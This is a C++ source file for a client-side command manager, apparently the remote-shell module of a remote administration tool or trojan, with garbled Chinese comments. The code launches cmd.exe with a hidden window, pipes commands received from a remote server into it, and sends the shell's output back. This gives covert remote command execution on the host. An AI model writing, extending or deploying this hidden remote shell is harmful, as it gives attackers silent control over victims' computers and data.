#include "ClientCmdManager.h"


CClientCmdManager::CClientCmdManager(_CIOCPClient* ClientObject) :CManager(ClientObject)
{
	//����һ��ܵ���Cmd���̽��н��̼�ͨ��

	m_CmdProcessHandle = NULL;
	m_CmdThreadHandle = NULL;
	m_ReadHandle1 = NULL;       //Client
	m_WriteHandle1 = NULL;       //Client
	m_ReadHandle2 = NULL;       //Cmd
	m_WriteHandle2 = NULL;       //Cmd


	SECURITY_ATTRIBUTES  SecurityAttributes = { 0 };
	SecurityAttributes.nLength = sizeof(SECURITY_ATTRIBUTES);
	SecurityAttributes.lpSecurityDescriptor = NULL;
	SecurityAttributes.bInheritHandle = TRUE;     //��Ҫ   ----->�̳й�ϵ   

	if (!CreatePipe(&m_ReadHandle1, &m_WriteHandle2, &SecurityAttributes, 0))
	{
		if (m_ReadHandle1 != NULL)
		{
			CloseHandle(m_ReadHandle1);
		}
		if (m_WriteHandle2 != NULL)
		{
			CloseHandle(m_WriteHandle2);
		}
		return;
	}

	if (!CreatePipe(&m_ReadHandle2, &m_WriteHandle1, &SecurityAttributes, 0))
	{
		if (m_WriteHandle1 != NULL)
		{
			CloseHandle(m_WriteHandle1);
		}
		if (m_ReadHandle2 != NULL)
		{
			CloseHandle(m_ReadHandle2);
		}
		return;
	}

	//����Cmd�ӽ��̲��Ҳ���ʾ����
	//���Cmd FullPath
	char  CmdFullPath[MAX_PATH] = { 0 };
	GetSystemDirectory(CmdFullPath, MAX_PATH);   //C:\windows\system32
												 //C:\windows\system32\cmd.exe
	strcat(CmdFullPath, "\\cmd.exe");

	STARTUPINFO          StartupInfo = { 0 };
	PROCESS_INFORMATION  ProcessInfo = { 0 };


	//һ��Ҫ��ʼ���ó�Ա
	StartupInfo.cb = sizeof(STARTUPINFO);

	StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	StartupInfo.hStdInput = m_ReadHandle2;                           //���ܵ�������Cmd��ֵ
	StartupInfo.hStdOutput = StartupInfo.hStdError = m_WriteHandle2;

	//��������
	StartupInfo.wShowWindow = SW_HIDE;


	//����Cmd����
	if (!CreateProcess(CmdFullPath, NULL, NULL, NULL, TRUE,
		NORMAL_PRIORITY_CLASS, NULL, NULL, &StartupInfo, &ProcessInfo))
	{
		CloseHandle(m_ReadHandle1);
		CloseHandle(m_WriteHandle1);
		CloseHandle(m_ReadHandle2);
		CloseHandle(m_WriteHandle2);
		return;
	}

	//����Cmd���̵Ľ��̾�������߳̾��
	m_CmdProcessHandle = ProcessInfo.hProcess;
	m_CmdThreadHandle = ProcessInfo.hThread;


	BYTE	IsToken = CLIENT_CMD_MANAGER_REPLY;
	m_ClientObject->OnServerSending((char*)&IsToken, 1);

	m_IsLoop = TRUE;
	WaitForServerDialogOpen();


	//������ȡ�ܵ��е����ݵ��߳�
	m_ThreadHandle = CreateThread(NULL, 0,
		(LPTHREAD_START_ROUTINE)ReceiveProcedure, (LPVOID)this, 0, NULL);

}
CClientCmdManager::~CClientCmdManager()
{
	printf("~CClientCmdManager()\r\n");

	m_IsLoop = FALSE;


	TerminateThread(m_CmdThreadHandle, 0);     //���������Լ�������Cmd�߳�
	TerminateProcess(m_CmdProcessHandle, 0);   //���������Լ�������Cmd����

	Sleep(100);

	if (m_ReadHandle1 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle1);
		CloseHandle(m_ReadHandle1);
		m_ReadHandle1 = NULL;
	}
	if (m_WriteHandle1 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle1);
		CloseHandle(m_WriteHandle1);
		m_WriteHandle1 = NULL;
	}
	if (m_ReadHandle2 != NULL)
	{
		DisconnectNamedPipe(m_ReadHandle2);
		CloseHandle(m_ReadHandle2);
		m_ReadHandle2 = NULL;
	}
	if (m_WriteHandle2 != NULL)
	{
		DisconnectNamedPipe(m_WriteHandle2);
		CloseHandle(m_WriteHandle2);
		m_WriteHandle2 = NULL;
	}
}
void CClientCmdManager::HandleIO(PBYTE BufferData, ULONG_PTR BufferLength)
{
	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{

		NotifyDialogIsOpen();
		break;
	}
	default:
	{
		//�ӵ���Server.exe���͹���������
		//��������д���ܵ�
		unsigned long	ReturnLength = 0;
		if (WriteFile(m_WriteHandle1, BufferData, BufferLength, &ReturnLength, NULL))
		{

		}
		break;
	}
	}
}
DWORD CClientCmdManager::ReceiveProcedure(LPVOID ParameterData)
{
	unsigned long   ReturnLength = 0;
	char	v1[0x400] = { 0 };
	DWORD	BufferLength = 0;
	CClientCmdManager* This = (CClientCmdManager*)ParameterData;

	while (This->m_IsLoop)
	{
		Sleep(100);
		//�������Ƿ�������  ���ݵĴ�С�Ƕ���
		while (PeekNamedPipe(This->m_ReadHandle1,     //��������
			v1, sizeof(v1), &ReturnLength, &BufferLength, NULL))
		{
			//���û�����ݾ�����������ѭ��
			if (ReturnLength <= 0)
				break;
			memset(v1, 0, sizeof(v1));
			LPBYTE BufferData = (LPBYTE)LocalAlloc(LPTR, BufferLength);
			//��ȡ�ܵ�����
			ReadFile(This->m_ReadHandle1,
				BufferData, BufferLength, &ReturnLength, NULL);

			This->m_ClientObject->OnServerSending((char*)BufferData, ReturnLength);

			LocalFree(BufferData);

		}
	}
	printf("CClientCmdManager::ReceiveProcedure() �˳�\r\n");
	return 0;
}